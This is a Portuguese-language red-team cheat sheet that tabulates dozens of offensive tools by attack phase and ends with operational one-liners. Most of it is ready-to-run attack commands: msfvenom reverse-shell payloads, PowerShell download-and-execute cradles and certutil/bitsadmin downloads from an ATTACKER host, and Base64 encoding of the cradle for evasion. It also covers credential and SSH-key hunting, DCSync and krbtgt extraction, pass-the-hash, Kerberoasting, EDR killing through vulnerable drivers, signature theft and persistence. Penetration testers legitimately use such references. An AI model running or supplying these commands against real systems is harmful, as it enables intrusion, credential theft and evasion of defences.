---
layout: cyber
section: cheatsheets
title: "Ferramentas Essenciais de Red Team — Referência Completa"
---

# Ferramentas Essenciais de Red Team — Referência Completa

> Mais de 60 ferramentas organizadas por fase, função, comando base e fonte.
> Atualizado para 2025 — inclui ferramentas modernas e clássicas.

---

## Tabela Principal de Ferramentas

### Reconhecimento e OSINT

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **nmap** | Recon | Scanner de rede, detecção de OS e serviços | `nmap -sV -sC -p- TARGET` | `apt install nmap` |
| **masscan** | Recon | Varredura de portas ultra-rápida | `masscan -p1-65535 TARGET --rate=1000` | `apt install masscan` |
| **Kerbrute** | Recon/AD | Enumeração e spray de usuários Kerberos | `kerbrute userenum -d DOM --dc IP users.txt` | github.com/ropnop/kerbrute |
| **BloodHound** | Recon/AD | Mapeamento de ataques em grafos no AD | GUI → Import JSON | github.com/BloodHoundAD/BloodHound |
| **SharpHound** | Recon/AD | Coletor de dados para BloodHound | `SharpHound.exe --CollectionMethods All` | github.com/BloodHoundAD/SharpHound |
| **BloodHound CE** | Recon/AD | BloodHound Community Edition (novo stack) | Docker + GUI | github.com/SpecterOps/BloodHound |
| **Snaffler** | Recon | Encontrar credenciais em shares SMB | `Snaffler.exe -s -d DOM -o out.log` | github.com/SnaffCon/Snaffler |
| **SpiderFoot** | OSINT | Plataforma de OSINT automatizada | `spiderfoot -l 127.0.0.1:5001` | `pip install spiderfoot` |
| **theHarvester** | OSINT | Coleta de emails, subdomínios, IPs | `theHarvester -d target.com -b all` | `apt install theharvester` |
| **Shodan** | OSINT | Busca de hosts expostos na internet | `shodan search "target.com"` | shodan.io + CLI |

### Acesso Inicial e Phishing

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **GoPhish** | Inicial | Plataforma de phishing | `./gophish` (servidor web) | getgophish.com |
| **Evilginx3** | Inicial | Phishing de credenciais com MFA bypass (AitM) | `./evilginx3 -p phishlets/` | github.com/kgretzky/evilginx |
| **MailSniper** | Inicial | Busca de credenciais em Exchange/O365 | `Invoke-GlobalMailSearch -ImpersonationAccount user` | github.com/dafthack/MailSniper |
| **msfvenom** | Inicial | Geração de payloads/shellcode | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe` | Incluído no Metasploit |
| **Metasploit** | Inicial/Post-Ex | Framework de exploração | `msfconsole` | `apt install metasploit-framework` |

### Evasão e Ofuscação

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **Freeze** | Evasão | Empacotar shellcode em executável com evasão | `./Freeze -I shellcode.bin -O payload.exe -encrypt` | github.com/optiv/Freeze |
| **ThreatCheck** | Evasão | Identificar exatamente qual byte aciona detecção | `ThreatCheck.exe -f payload.exe -e AMSI` | github.com/rasta-mouse/ThreatCheck |
| **Donut** | Evasão | Converter exe/.NET/script em shellcode | `./donut -f input.exe -o shellcode.bin` | github.com/TheWover/donut |
| **ScareCrow** | Evasão | Criação de loaders com técnicas de evasão | `ScareCrow -I shellcode.bin -Loader dll` | github.com/optiv/ScareCrow |
| **Invoke-Obfuscation** | Evasão | Obfuscar scripts PowerShell | `Invoke-Obfuscation` (menu interativo) | github.com/danielbohannon/Invoke-Obfuscation |
| **AMSI.fail** | Evasão | Gerador de bypasses AMSI atualizados | Uso via site | amsi.fail |
| **Chameleon** | Evasão | Bypassar assinaturas PowerShell | `chameleon.py -l payload.ps1` | github.com/kleiton0x00/Chameleon |

### Frameworks C2

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **Cobalt Strike** | C2 | C2 comercial avançado com Beacon | `./teamserver IP pass profile.malleable` | cobaltstrike.com (licenciado) |
| **Sliver** | C2 | C2 open-source moderno (Go) | `./sliver-server` | github.com/BishopFox/sliver |
| **Havoc** | C2 | C2 open-source moderno com GUI | `./havoc server --profile profile.yaotl` | github.com/HavocFramework/Havoc |
| **Brute Ratel** | C2 | C2 comercial adversarial (BRC4) | Proprietário | bruteratel.com (licenciado) |
| **Metasploit** | C2/Exploit | Framework clássico, meterpreter | `msfconsole; use multi/handler` | github.com/rapid7/metasploit-framework |

### Enumeração e Post-Exploitation do AD

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **PowerView** | Post-Ex/AD | Enumeração de AD via PowerShell | `Get-DomainUser -SPN; Get-DomainComputer` | github.com/PowerShellMafia/PowerSploit |
| **SharpView** | Post-Ex/AD | PowerView em C# (execute-assembly) | `execute-assembly SharpView.exe Get-DomainUser` | github.com/tevora-threat/SharpView |
| **PowerUp** | Post-Ex | Escalada de privilégio local no Windows | `Invoke-AllChecks; Get-ModifiableServiceFile` | github.com/PowerShellMafia/PowerSploit |
| **WinPEAS** | Post-Ex | Enumeração de escalada de privilégio Windows | `winpeas.exe; winpeasx64.exe` | github.com/carlospolop/PEASS-ng |
| **LinPEAS** | Post-Ex | Enumeração de escalada no Linux | `./linpeas.sh` | github.com/carlospolop/PEASS-ng |
| **Seatbelt** | Post-Ex | Enumeração detalhada do host Windows | `Seatbelt.exe -group=all` | github.com/GhostPack/Seatbelt |
| **SharpUp** | Post-Ex | Verificação de caminhos de escalada | `SharpUp.exe audit` | github.com/GhostPack/SharpUp |
| **GTFOBins** | Post-Ex | Referência de LOLBins Linux | Site de consulta | gtfobins.github.io |
| **LOLBAS** | Post-Ex | Referência de LOLBins Windows | Site de consulta | lolbas-project.github.io |

### Credenciais e Dump

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **Mimikatz** | Creds | Dump de credenciais do lsass, golden/silver tickets | `sekurlsa::logonpasswords; lsadump::dcsync` | github.com/gentilkiwi/mimikatz |
| **nanodump** | Creds | Dump furtivo do LSASS | `nanodump.exe --write lsass.dmp` | github.com/helpsystems/nanodump |
| **pypykatz** | Creds | Parsear dumps LSASS no Linux | `pypykatz lsa minidump lsass.dmp` | `pip3 install pypykatz` |
| **SharpDPAPI** | Creds | Extrair secretos DPAPI | `SharpDPAPI.exe triage; credentials; browser` | github.com/GhostPack/SharpDPAPI |
| **LaZagne** | Creds | Dump de senhas de múltiplos apps | `lazagne.exe all` | github.com/AlessandroZ/LaZagne |
| **hashcat** | Creds | Cracking de hashes GPU | `hashcat -m 1000 hashes.txt rockyou.txt` | hashcat.net |
| **John the Ripper** | Creds | Cracking de hashes CPU | `john --wordlist=rockyou.txt hashes.txt` | openwall.com/john |

### Kerberos

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **Rubeus** | Kerberos | Toolkit Kerberos completo — roast, tickets, S4U | `Rubeus.exe triage; asreproast; kerberoast` | github.com/GhostPack/Rubeus |
| **impacket** | Kerberos/All | Suite completa de ferramentas de protocolo | Múltiplas ferramentas | github.com/fortra/impacket |
| — GetUserSPNs.py | Kerberos | Kerberoasting | `GetUserSPNs.py DOM/user:pass -dc-ip IP -request` | Incluído no impacket |
| — GetNPUsers.py | Kerberos | AS-REP Roasting | `GetNPUsers.py DOM/user:pass -dc-ip IP -request` | Incluído no impacket |
| — secretsdump.py | Creds | DCSync, SAM dump | `secretsdump.py DOM/user:pass@DC -just-dc` | Incluído no impacket |
| — ticketer.py | Kerberos | Golden/Silver ticket | `ticketer.py -nthash HASH -domain-sid SID -domain DOM admin` | Incluído no impacket |
| — getST.py | Kerberos | S4U, constrained delegation | `getST.py DOM/svc:pass -spn cifs/host -impersonate admin` | Incluído no impacket |
| — ticketConverter.py | Kerberos | kirbi ↔ ccache | `ticketConverter.py ticket.kirbi ticket.ccache` | Incluído no impacket |
| — addcomputer.py | AD | Criar conta de computador para RBCD | `addcomputer.py DOM/user:pass -computer-name PC$` | Incluído no impacket |
| — rbcd.py | AD | Configurar RBCD | `rbcd.py DOM/user:pass -delegate-from PC$ -delegate-to HOST$` | Incluído no impacket |
| — psexec.py | Lateral | Execução remota via SMB | `psexec.py -hashes :HASH DOM/user@IP` | Incluído no impacket |
| — wmiexec.py | Lateral | Execução remota via WMI | `wmiexec.py -hashes :HASH DOM/user@IP` | Incluído no impacket |
| — smbexec.py | Lateral | Execução remota SMB alternativo | `smbexec.py -hashes :HASH DOM/user@IP` | Incluído no impacket |
| — ntlmrelayx.py | NTLM | Relay de hashes NTLM | `ntlmrelayx.py -tf targets.txt -smb2support` | Incluído no impacket |
| — printerbug.py | AD | Forçar autenticação (SpoolSample) | `printerbug.py DOM/user:pass@DC LISTENER` | Incluído no impacket |

### ADCS (Active Directory Certificate Services)

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **Certify** | ADCS | Enumeração e exploração de ADCS | `Certify.exe find /vulnerable; req /ca:CA /template:Vuln` | github.com/GhostPack/Certify |
| **Certipy** | ADCS | ADCS attack tool (Python — Kali) | `certipy find -u user@dom -p pass -dc-ip IP` | github.com/ly4k/Certipy |
| **ForgeCert** | ADCS | Forjar certificados com CA private key | `ForgeCert.exe /ca:CA.pfx /template:User /altname:admin` | github.com/GhostPack/ForgeCert |
| **ADCSPwn** | ADCS | Exploração de ADCS ESC8 (NTLM relay) | `ADCSPwn.exe --adcs ADCS_HOST --port 1000` | github.com/bats3c/ADCSPwn |
| **PKINITtools** | ADCS | Usar certificados para obter TGTs | `gettgtpkinit.py DOM/user -cert-pfx cert.pfx ticket.ccache` | github.com/dirkjanm/PKINITtools |

### Lateral Movement e Remote Execution

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **CrackMapExec** | Lateral | Swiss army knife de AD lateral movement | `cme smb TARGET -u user -p pass --shares` | github.com/byt3bl33d3r/CrackMapExec |
| **NetExec** | Lateral | Fork ativo do CrackMapExec | `netexec smb TARGET -u user -H HASH` | github.com/Pennyw0rth/NetExec |
| **evil-winrm** | Lateral | Shell interativa via WinRM | `evil-winrm -i IP -u user -p pass` | github.com/Hackplayers/evil-winrm |
| **PowerUpSQL** | SQL | Enumeração e exploração de MSSQL | `Get-SQLServerLinkCrawl -Instance "SRV\INST"` | github.com/NetSPI/PowerUpSQL |
| **mssqlclient.py** | SQL | Cliente MSSQL com xp_cmdshell | `mssqlclient.py DOM/user:pass@IP -windows-auth` | Incluído no impacket |

### Privilege Escalation

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **SpoolSample** | PrivEsc/AD | Forçar autenticação do DC via Print Spooler | `SpoolSample.exe DC_HOST ATTACKER_HOST` | github.com/leechristensen/SpoolSample |
| **PetitPotam** | PrivEsc/AD | Forçar autenticação via EFS (alternativa ao SpoolSample) | `PetitPotam.exe LISTENER DC` | github.com/topotam/PetitPotam |
| **Responder** | Creds | Poisoning de LLMNR/NBT-NS/mDNS | `sudo responder -I eth0 -wrf` | github.com/lgandx/Responder |
| **SharpToken** | PrivEsc | Token manipulation e impersonation | `SharpToken.exe steal PID` | github.com/BeichenDream/SharpToken |

### Evasão Avançada / Kernel

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **EDRSandblast** | Evasão/Kernel | Remover callbacks de EDR via BYOVD | `EDRSandblast.exe -a killAV --driver RTCore64.sys` | github.com/wavestone-cdt/EDRSandblast |
| **Backstab** | Evasão/Kernel | Terminar processos PPL (AV/EDR) | `Backstab.exe -n MsMpEng.exe -k` | github.com/Yaxser/Backstab |
| **kdmapper** | Evasão/Kernel | Carregar driver não-assinado em memória | `kdmapper.exe custom_driver.sys` | github.com/TheCruZ/kdmapper |
| **LOLDrivers.io** | Referência | Catálogo de drivers vulneráveis com IOCTLs | Site de consulta | loldrivers.io |
| **SilkETW** | Análise | Consumir e analisar eventos ETW | `SilkETW.exe -t user -pn Microsoft-Windows-Threat-Intelligence` | github.com/mandiant/SilkETW |

### Pivoting e Tunelamento

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **Ligolo-ng** | Pivoting | Criar interface de rede via TLS tunnel | `./ligolo-proxy -selfcert -laddr 0.0.0.0:11601` | github.com/nicocha30/ligolo-ng |
| **Chisel** | Pivoting | Tunnel TCP/UDP via HTTP | `./chisel server -p 8080 --reverse` | github.com/jpillora/chisel |
| **SOCAT** | Pivoting | Relay TCP/UDP simples | `socat TCP-LISTEN:8080,fork TCP:TARGET:80` | `apt install socat` |
| **Proxychains** | Pivoting | Roteamento de tráfego via SOCKS/HTTP | `proxychains nmap TARGET` | `apt install proxychains4` |

### Exfiltração e Análise

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **Wireshark** | Análise | Captura e análise de pacotes | GUI | wireshark.org |
| **tcpdump** | Análise | Captura de pacotes linha de comando | `tcpdump -i eth0 -w capture.pcap` | `apt install tcpdump` |
| **Burp Suite** | Web | Proxy de interceptação HTTP | GUI + Proxy 127.0.0.1:8080 | portswigger.net |
| **sqlmap** | Web | Automação de SQL injection | `sqlmap -u "URL?id=1" --dbs` | `apt install sqlmap` |

### BOF (Beacon Object Files) e Extensões C2

| Ferramenta | Fase | Função | Comando Base | Onde Obter |
|-----------|------|--------|-------------|-----------|
| **CS-Situational-Awareness-BOF** | Post-Ex | Coleção de BOFs para recon | Via aggressor script | github.com/trustedsec/CS-Situational-Awareness-BOF |
| **TrustedSec BOF Collection** | Post-Ex | Coleção geral de BOFs | Via aggressor script | github.com/trustedsec/CS-Remote-Ops-BOF |
| **InlineExecute-Assembly** | Post-Ex | Executar .NET assemblies inline no beacon | BOF via CS | github.com/anthemtotheego/InlineExecute-Assembly |
| **BofNet** | Post-Ex | Framework de BOF para .NET | Via CS | github.com/williamknows/BOF.NET |

---

## Impacket — Tabela Completa de Ferramentas

| Ferramenta | Função | Exemplo de Uso |
|-----------|--------|---------------|
| `psexec.py` | RCE via SMB (cria serviço) | `psexec.py DOM/user:pass@IP` |
| `smbexec.py` | RCE via SMB (sem arquivos em disco) | `smbexec.py DOM/user:pass@IP` |
| `wmiexec.py` | RCE via WMI | `wmiexec.py DOM/user:pass@IP "cmd"` |
| `atexec.py` | RCE via Task Scheduler | `atexec.py DOM/user:pass@IP "cmd"` |
| `dcomexec.py` | RCE via DCOM | `dcomexec.py -object MMC20 DOM/user:pass@IP` |
| `secretsdump.py` | DCSync, SAM, LSA dump | `secretsdump.py DOM/user:pass@IP -just-dc` |
| `GetUserSPNs.py` | Kerberoasting | `GetUserSPNs.py DOM/user:pass -dc-ip IP -request` |
| `GetNPUsers.py` | AS-REP Roasting | `GetNPUsers.py DOM/ -dc-ip IP -no-pass` |
| `getTGT.py` | Obter TGT → ccache | `getTGT.py DOM/user:pass -dc-ip IP` |
| `getST.py` | Obter TGS, S4U2self/proxy | `getST.py DOM/svc:pass -spn cifs/host -impersonate admin` |
| `ticketer.py` | Criar Golden/Silver ticket | `ticketer.py -nthash HASH -domain-sid SID -domain DOM user` |
| `ticketConverter.py` | kirbi ↔ ccache | `ticketConverter.py ticket.kirbi ticket.ccache` |
| `smbclient.py` | Browse shares SMB | `smbclient.py -k -no-pass //TARGET/C$` |
| `smbserver.py` | Servir arquivos via SMB | `smbserver.py share /path -smb2support` |
| `ntlmrelayx.py` | Relay de hashes NTLM | `ntlmrelayx.py -tf targets.txt -smb2support` |
| `addcomputer.py` | Criar conta de computador | `addcomputer.py DOM/user:pass -computer-name PC$ -computer-pass pass` |
| `rbcd.py` | Configurar RBCD | `rbcd.py DOM/user:pass -delegate-from PC$ -delegate-to HOST$ -action write` |
| `mssqlclient.py` | Cliente MSSQL | `mssqlclient.py DOM/user:pass@IP -windows-auth` |
| `printerbug.py` | Forçar autenticação Spooler | `printerbug.py DOM/user:pass@DC LISTENER` |
| `reg.py` | Operações de registry remoto | `reg.py DOM/user:pass@IP query -keyName HKLM\SAM` |
| `lookupsid.py` | Enumerar SIDs | `lookupsid.py DOM/user:pass@IP` |
| `samrdump.py` | Dump de usuários via SAMR | `samrdump.py DOM/user:pass@IP` |
| `rpcdump.py` | Enumerar RPC endpoints | `rpcdump.py @IP` |
| `netview.py` | Netview de hosts do domínio | `netview.py DOM/user:pass` |

---

## Recursos de Referência (Sites e Repositórios)

| Recurso | Tipo | URL | Uso |
|---------|------|-----|-----|
| GTFOBins | Referência | gtfobins.github.io | LOLBins Linux |
| LOLBAS | Referência | lolbas-project.github.io | LOLBins Windows |
| LOLDrivers | Referência | loldrivers.io | Drivers vulneráveis para BYOVD |
| HackTricks | Wiki | book.hacktricks.xyz | Técnicas e referência geral |
| PayloadsAllTheThings | Repositório | github.com/swisskyrepo/PayloadsAllTheThings | Payloads e cheatsheets |
| ired.team | Blog/Wiki | ired.team | Técnicas de red team documentadas |
| MITRE ATT&CK | Framework | attack.mitre.org | Mapeamento de TTPs |
| OffSec Exploit DB | Database | exploit-db.com | Exploits públicos |
| SecLists | Wordlists | github.com/danielmiessler/SecLists | Wordlists para tudo |
| MalAPI.io | Referência | malapi.io | APIs Windows usadas por malware |
| AMSI.fail | Ferramenta | amsi.fail | Bypasses AMSI atualizados |
| VX-Underground | Malware | vx-underground.org | Amostras de malware para estudo |
| Unprotect Project | Referência | unprotect.it | Técnicas de evasão documentadas |

---

## Fluxo de Decisão: Qual Ferramenta Para Cada Objetivo

```
OBJETIVO: Reconhecimento Inicial do AD
├─ Sem credenciais: Kerbrute (user enum) → Responder (capturar hashes)
└─ Com credenciais: BloodHound/SharpHound → PowerView → Snaffler

OBJETIVO: Obter Credenciais
├─ LSASS dump: nanodump → pypykatz
├─ Kerberoasting: Rubeus kerberoast → GetUserSPNs.py → hashcat -m 13100
├─ AS-REP Roasting: Rubeus asreproast → GetNPUsers.py → hashcat -m 18200
├─ DCSync (DA): secretsdump.py → Mimikatz lsadump::dcsync
└─ ADCS: Certify find → certipy req → certipy auth

OBJETIVO: Movimento Lateral
├─ Com hash: psexec.py / wmiexec.py / evil-winrm (WinRM)
├─ Com ticket: export KRB5CCNAME → psexec.py -k -no-pass
└─ Via CS: jump wmi TARGET LISTENER / jump winrm TARGET LISTENER

OBJETIVO: Evadir EDR
├─ Payload: ThreatCheck → Freeze/Donut → ofuscação
├─ Sem kernel: AMSI bypass → process injection em processo legítimo
└─ Com kernel (BYOVD): EDRSandblast (RTCore64/DBUtil) → remove callbacks → payload

OBJETIVO: Pivoting para Rede Interna
├─ Setup rápido: Chisel (client → R:1080:socks)
├─ Múltiplas redes: Ligolo-ng (interface TUN, roteamento nativo)
└─ Windows sem tools: Netsh portproxy + Plink (SSH reverso)

OBJETIVO: Persistência
├─ Registry Run keys: reg add HKCU\...\Run
├─ Serviço: sc create + sc start
├─ WMI subscription: New-WMIEventSubscription (PowerLurk)
└─ Golden Ticket: Mimikatz lsadump::dcsync /user:krbtgt → ticket vitalício
```

---

## Tabela Resumida por Categoria (Referencia Rapida)

### Evasao — SigThief, PEzor, ConfuserEx

| Ferramenta  | Funcao                                       | Comando Base                                                   | Onde Obter                                   |
|-------------|----------------------------------------------|----------------------------------------------------------------|----------------------------------------------|
| SigThief    | Roubar assinatura Authenticode de exe legitimo| `python sigthief.py -i legit.exe -t payload.exe -o signed.exe` | github.com/secretsquirrel/SigThief          |
| PEzor       | Empacotador de PE com evasao multi-tecnica   | `PEzor.sh -unhook -antidebug payload.exe`                      | github.com/phra/PEzor                        |
| DefenderCheck| Localizar byte detectado pelo Defender       | `DefenderCheck.exe payload.exe`                                | github.com/matterpreter/DefenderCheck        |
| ConfuserEx  | Ofuscador de assemblies .NET                 | GUI / `ConfuserEx.exe -n project.crproj`                       | github.com/mkaring/ConfuserEx                |
| Freeze      | Payload generator com evasao via Go          | `./Freeze -I shellcode.bin -o payload.exe`                     | github.com/optiv/Freeze                      |

### Syscalls / Kernel

| Ferramenta    | Funcao                                       | Comando Base                                              | Onde Obter                               |
|---------------|----------------------------------------------|-----------------------------------------------------------|------------------------------------------|
| SysWhispers2  | Gerar stubs de syscalls diretas              | `python3 syswhispers.py --preset all -o syscalls`         | github.com/jthuraisamy/SysWhispers2      |
| SysWhispers3  | Syscalls com WoW64 e jumps evasivos          | `python3 syswhispers.py --preset all`                     | github.com/klezVirus/SysWhispers3        |
| HellsGate     | Resolucao dinamica de syscall IDs em runtime | (header incluido em projeto C/C++)                        | github.com/am0nsec/HellsGate             |
| kdmapper      | Mapear driver sem assinatura (BYOVD)         | `kdmapper.exe driver.sys`                                 | github.com/TheCruZ/kdmapper              |

### Post-Exploitation — ADRecon, Seatbelt, LaZagne

| Ferramenta  | Funcao                                       | Comando Base                               | Onde Obter                               |
|-------------|----------------------------------------------|--------------------------------------------|------------------------------------------|
| ADRecon     | Relatorio completo do AD em Excel/HTML       | `.\ADRecon.ps1 -OutputDir C:\ADRecon`      | github.com/adrecon/ADRecon               |
| Seatbelt    | Coleta defensiva de informacoes do host      | `Seatbelt.exe -group=all`                  | github.com/GhostPack/Seatbelt            |
| LaZagne     | Dump de senhas de browsers, apps, SSH...     | `lazagne.exe all`                          | github.com/AlessandroZ/LaZagne           |
| SharpView   | PowerView reescrito em C# (execute-assembly) | `SharpView.exe Get-DomainUser`             | github.com/tevora-threat/SharpView       |

### Phishing — GoPhish, Evilginx2, SET, MailSniper, o365spray

| Ferramenta  | Funcao                                       | Comando Base                                                        | Onde Obter                               |
|-------------|----------------------------------------------|---------------------------------------------------------------------|------------------------------------------|
| GoPhish     | Plataforma de campanha de phishing           | `./gophish` (painel web em :3333)                                   | getgophish.com                           |
| Evilginx2   | Reverse proxy AitM para bypass de MFA        | `./evilginx2 -p phishlets/`                                         | github.com/kgretzky/evilginx2            |
| SET         | Social Engineering Toolkit                   | `setoolkit`                                                         | `apt install set`                        |
| MailSniper  | Busca de credenciais e emails no Exchange    | `Invoke-SelfSearch -Mailbox user@dom -SearchTerm password`          | github.com/dafthack/MailSniper           |
| o365spray   | User enum e password spray em O365          | `python3 o365spray.py --spray -U users.txt -p 'Password123!'`       | github.com/0xZDH/o365spray               |

### Privilege Escalation — PrintSpoofer, GodPotato

| Ferramenta   | Funcao                                            | Comando Base                                 | Onde Obter                                |
|--------------|---------------------------------------------------|----------------------------------------------|-------------------------------------------|
| PrintSpoofer | PrivEsc via Print Spooler (NETWORK/LOCAL SERVICE) | `PrintSpoofer.exe -i -c cmd`                 | github.com/itm4n/PrintSpoofer            |
| GodPotato    | Potato moderno Windows 10/2019+                   | `GodPotato.exe -cmd "cmd /c whoami"`         | github.com/BeichenDream/GodPotato        |
| PowerUp      | Enum de vetores de privesc Windows               | `Import-Module PowerUp.ps1; Invoke-AllChecks`| github.com/PowerShellMafia/PowerSploit   |
| WinPEAS      | Enum completa privesc Windows                    | `winPEASany.exe`                             | github.com/carlospolop/PEASS-ng          |
| LinPEAS      | Enum completa privesc Linux                      | `./linpeas.sh`                               | github.com/carlospolop/PEASS-ng          |
| SharpUp      | Enum privesc em C# (execute-assembly)            | `SharpUp.exe audit`                          | github.com/GhostPack/SharpUp             |

### Analise Forense e Reversao

| Ferramenta      | Funcao                                       | Comando Base                                         | Onde Obter                             |
|-----------------|----------------------------------------------|------------------------------------------------------|----------------------------------------|
| Ghidra          | Framework de engenharia reversa (NSA)        | `./ghidraRun`                                        | ghidra-sre.org                         |
| x64dbg          | Debugger Windows para x64 e x86             | `x64dbg.exe`                                         | x64dbg.com                             |
| ProcMon         | Monitor de processos, registro e rede        | `procmon.exe` (GUI Sysinternals)                     | learn.microsoft.com/sysinternals       |
| ProcessHacker2  | Task manager avancado com acesso a memoria  | `ProcessHacker.exe`                                  | processhacker.sourceforge.io           |
| SilkETW         | Consumir eventos ETW para analise/defesa     | `SilkETW.exe -t user -pn Microsoft-Windows-Threat-Intelligence` | github.com/mandiant/SilkETW |

### MSSQL

| Ferramenta    | Funcao                                       | Comando Base                                                   | Onde Obter                          |
|---------------|----------------------------------------------|----------------------------------------------------------------|-------------------------------------|
| PowerUpSQL    | Enum e escalada de privilegios no MSSQL      | `Get-SQLInstanceDomain \| Get-SQLServerInfo`                   | github.com/NetSPI/PowerUpSQL        |
| mssqlclient.py| Shell interativo no MSSQL via Impacket       | `mssqlclient.py dom/user:pass@SQLSERVER -windows-auth`        | pip install impacket                |

### Network — Responder, mitm6, Nmap, Masscan, CME

| Ferramenta    | Funcao                                       | Comando Base                                       | Onde Obter              |
|---------------|----------------------------------------------|----------------------------------------------------|-------------------------|
| Nmap          | Port scanner com scripts NSE                 | `nmap -sV -sC -p- TARGET`                          | `apt install nmap`      |
| Masscan       | Port scanner ultra-rapido                    | `masscan -p1-65535 TARGET --rate=10000`             | `apt install masscan`   |
| CrackMapExec  | Swiss-knife Windows: enum, spray, exec       | `crackmapexec smb TARGET -u user -p pass`           | `pipx install cme`      |
| Responder     | Poisoning LLMNR/NBT-NS e captura de hashes  | `responder -I eth0 -wF`                             | `apt install responder` |
| mitm6         | IPv6 + DHCPv6 para relay LDAP/SMB           | `mitm6 -d domain.local`                             | `pip install mitm6`     |

---

## One-liners Uteis

### Active Directory

```powershell
# Listar todos os computadores do dominio com OS
Get-ADComputer -Filter * -Properties * | Select Name,OperatingSystem | Sort Name

# Membros do Domain Admins
Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName

# Usuarios com SPN (Kerberoasting candidates)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select SamAccountName,ServicePrincipalName

# Usuarios sem pre-autenticacao (AS-REP Roasting candidates)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select SamAccountName

# Contas com delegacao irrestrita (Unconstrained Delegation)
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name

# Contas com delegacao restrita (Constrained Delegation)
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo | Select Name,'msDS-AllowedToDelegateTo'

# Politica de senha do dominio
Get-ADDefaultDomainPasswordPolicy
```

### Network Scanning

```bash
# Port scan rapido (todas as portas)
nmap -T4 -p- --min-rate 5000 TARGET

# Scan de servicos em portas abertas
nmap -sV -sC -p 22,80,443,445,3389,5985,8080 TARGET

# Masscan rapido + parse para nmap
masscan -p1-65535 192.168.1.0/24 --rate=5000 -oG masscan.out
grep open masscan.out | awk '{print $4}' | cut -d/ -f1 | sort -u | tr '\n' ',' | sed 's/,$//' > ports.txt
nmap -sV -p $(cat ports.txt) TARGET

# CME — verificar SMB signing (false = relay possivel)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

### Execucao Privilegiada

```cmd
:: Spawnar shell como SYSTEM
PsExec64.exe -i -s cmd.exe
PsExec64.exe -i -s powershell.exe

:: GodPotato (NETWORK SERVICE -> SYSTEM)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Windows\Temp\payload.exe"
```

### PowerShell — Execucao e Bypass

```powershell
# Executar payload remoto sem toque em disco
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/payload.ps1")
IEX (iwr http://ATTACKER/payload.ps1 -UseBasicParsing)

# Bypass de execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX..."

# Encode payload em Base64 para execucao
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/payload.ps1")'))
# Usar: powershell -enc BASE64_RESULTADO

# Download de arquivo
(New-Object Net.WebClient).DownloadFile("http://ATTACKER/agent.exe","C:\Windows\Temp\agent.exe")
Invoke-WebRequest -Uri "http://ATTACKER/agent.exe" -OutFile "C:\Windows\Temp\agent.exe"
certutil -urlcache -split -f http://ATTACKER/agent.exe C:\Windows\Temp\agent.exe
bitsadmin /transfer job /download /priority foreground http://ATTACKER/agent.exe C:\Windows\Temp\agent.exe
```

### Busca de Credenciais em Arquivos

```cmd
:: Buscar arquivos suspeitos
dir /s /b *.config *.xml *.ini *password* *cred* *secret* 2>nul
dir /s /b *.kdbx *.pfx *.p12 *.pem *.key 2>nul

:: Buscar strings de senha
findstr /si "password" *.xml *.ini *.txt *.config *.ps1 *.bat
findstr /si "connectionstring" *.config *.xml
findstr /si "secret" *.json *.yaml *.yml

:: Historico de PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul

:: Credenciais salvas
cmdkey /list
```

```bash
# Linux — busca de credenciais
grep -rni "password" /var/www/ /home/ /opt/ 2>/dev/null | grep -v ".pyc"
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null
```

### Pass-the-Hash Rapido

```bash
# Verificar hash valido em toda a rede
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH | grep Pwn3d

# Exec com hash
psexec.py domain.local/Administrator@TARGET -hashes :NTLM_HASH
wmiexec.py domain.local/Administrator@TARGET -hashes :NTLM_HASH
evil-winrm -i TARGET -u Administrator -H NTLM_HASH
```

### Kerberos One-liners

```bash
# Kerberoast + crack
GetUserSPNs.py domain.local/user:Pass -request -outputfile spn.txt && hashcat -m 13100 spn.txt rockyou.txt

# AS-REP Roast + crack
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass | grep krb5asrep | tee asrep.txt && hashcat -m 18200 asrep.txt rockyou.txt

# DCSync + extrair krbtgt e Administrator
secretsdump.py domain.local/DA:Pass@DC01 -just-dc-ntlm | grep -E "krbtgt|Administrator"

# Usar ccache
export KRB5CCNAME=ticket.ccache && psexec.py -k -no-pass domain.local/admin@TARGET
```

